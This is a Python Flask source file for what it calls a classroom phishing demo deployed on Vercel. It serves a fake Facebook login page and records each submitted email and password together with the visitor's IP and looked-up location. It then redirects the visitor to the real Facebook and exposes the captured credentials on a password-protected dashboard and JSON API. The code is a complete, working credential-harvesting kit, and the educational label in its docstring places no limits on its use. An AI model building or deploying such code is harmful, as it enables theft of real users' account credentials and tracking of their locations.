"""
Vercel Serverless Function — Flask app for the phishing demo.

This file is the Vercel entry point. It re-implements the same logic as
the local app.py but adapted for Vercel's serverless environment:

  • Storage uses /tmp/credentials.json (Vercel's writable but EPHEMERAL
    filesystem). Data persists while the function is "warm" but will be
    lost when Vercel recycles the container (typically after ~5-15 min
    of inactivity). This is fine for a live classroom demo.
  • fcntl file-locking is removed — serverless invocations rarely overlap
    on the same container, so the complexity isn't worth it here.
  • Static files (index.html, fb1.png) are served by Vercel directly
    (see vercel.json routes). This function only handles dynamic routes.
"""

from flask import Flask, request, redirect, jsonify, send_file
from functools import wraps
import json
from datetime import datetime
import os
import requests as http_requests   # renamed to avoid shadowing flask.request
import ipaddress
from markupsafe import escape

# ---------------------------------------------------------------------------
# Path setup
# ---------------------------------------------------------------------------
# On Vercel the project files sit one directory above api/
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Credentials storage — /tmp is the ONLY writable path on Vercel.
# Data here is ephemeral: it survives between requests while the function
# stays warm, but is wiped when the container is recycled.
# For a classroom demo this is perfectly fine.
# ---------------------------------------------------------------------------
CREDENTIALS_FILE = '/tmp/credentials.json'

# ---------------------------------------------------------------------------
# Dashboard authentication
# ---------------------------------------------------------------------------
DASHBOARD_USERNAME = 'admin'
DASHBOARD_PASSWORD = 'demo2024'


def require_auth(f):
    """HTTP Basic Auth decorator for protected routes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if (
            not auth
            or auth.username != DASHBOARD_USERNAME
            or auth.password != DASHBOARD_PASSWORD
        ):
            return (
                'Unauthorized — enter dashboard credentials.',
                401,
                {'WWW-Authenticate': 'Basic realm="Dashboard"'},
            )
        return f(*args, **kwargs)
    return decorated


# ---------------------------------------------------------------------------
# Input sanitization
# ---------------------------------------------------------------------------
MAX_INPUT_LENGTH = 256


def sanitize_input(value: str) -> str:
    """Strip, truncate, and HTML-escape user input."""
    if not isinstance(value, str):
        return ''
    value = value.strip()[:MAX_INPUT_LENGTH]
    return str(escape(value))


# ---------------------------------------------------------------------------
# Credential helpers
# ---------------------------------------------------------------------------

def load_credentials():
    """Load credentials from the temp file."""
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, FileNotFoundError, OSError):
            return []
    return []


def save_credentials(email, password, ip=None, location=None):
    """Append a new credential entry and write back to /tmp."""
    credentials_data = load_credentials()

    entry = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat(),
    }
    if ip:
        entry['ip'] = ip
    if location:
        entry['location'] = location
    credentials_data.append(entry)

    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(credentials_data, f, indent=2)


def clear_credentials():
    """Delete the credentials file."""
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route('/')
def index():
    """Serve the phishing login page."""
    return send_file(os.path.join(PROJECT_ROOT, 'index.html'))


@app.route('/login', methods=['POST'])
def login():
    """Capture submitted credentials, then redirect to real Facebook."""
    email = sanitize_input(request.form.get('email', ''))
    password = sanitize_input(request.form.get('password', ''))

    # Client IP — respect X-Forwarded-For (Vercel always sets this)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # X-Forwarded-For may contain multiple IPs; take the first (client IP)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    location = None
    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_loopback or addr.is_private:
            location = 'Local network'
        else:
            resp = http_requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                pieces = [
                    data[field]
                    for field in ('city', 'regionName', 'country')
                    if data.get(field)
                ]
                if pieces:
                    location = ", ".join(pieces)
    except (ValueError, http_requests.RequestException):
        location = None

    if email and password:
        save_credentials(email, password, ip=ip, location=location)
        print(f"✓ Credentials captured: {email} (ip={ip} location={location})")

    return redirect('https://www.facebook.com')


@app.route('/dashboard')
@require_auth
def dashboard():
    """Serve the live dashboard (auth-protected)."""
    return send_file(os.path.join(PROJECT_ROOT, 'dashboard.html'))


@app.route('/api/credentials', methods=['GET'])
@require_auth
def api_credentials():
    """Return captured credentials as JSON."""
    credentials = load_credentials()
    return jsonify({
        'count': len(credentials),
        'credentials': credentials,
    })


@app.route('/api/clear-credentials', methods=['POST'])
@require_auth
def api_clear():
    """Clear all credentials."""
    clear_credentials()
    return jsonify({'status': 'success', 'message': 'All credentials cleared'})
